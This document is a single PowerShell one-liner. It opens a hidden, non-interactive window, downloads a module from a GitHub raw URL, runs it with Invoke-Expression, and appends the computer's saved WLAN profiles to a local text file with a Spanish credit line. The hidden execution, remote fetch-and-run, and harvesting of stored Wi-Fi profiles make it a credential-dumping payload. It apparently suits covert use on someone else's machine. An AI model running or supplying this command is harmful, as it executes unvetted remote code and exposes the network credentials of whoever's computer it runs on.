powershell -NoProfile -NoLogo -WindowStyle Hidden -NonInteractive -Command "Invoke-Expression ("((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mz39729/Get-WlanProfiles/main/Get-WlanProfiles.psm1'))");Out-File -FilePath "WLAN_Profiles.txt" -Encoding ascii -Append -InputObject ('Fuente: https://github.com/mz39729/Get-WlanProfiles - Autor: https://github.com/H3LL0WORLD:  ' + (Get-WLAN_Profiles | Format-Table | Out-String))"